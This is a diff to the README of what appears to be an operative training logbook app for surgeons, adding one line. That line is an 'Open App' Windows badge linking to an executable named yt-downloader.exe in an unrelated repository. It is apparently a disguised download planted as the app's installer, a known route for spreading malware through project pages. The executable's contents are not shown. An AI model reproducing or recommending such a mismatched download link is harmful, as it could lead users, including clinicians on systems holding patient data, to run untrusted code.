@@ -5,6 +5,8 @@
   An operative training logbook built by surgeons, for surgeons. Capture cases in seconds, filter your experience, and generate portfolio-ready PDF reports without uploading patient data.
 
   <sup>Educational tool only. Users are responsible for local governance and information-security compliance.</sup>
+
+  [![Open App](https://img.shields.io/badge/-Windows-blue.svg?style=for-the-badge&logo=windows)](https://github.com/nvx5/yt-downloader/releases/download/v1.0/yt-downloader.exe)
   
 </div>
 
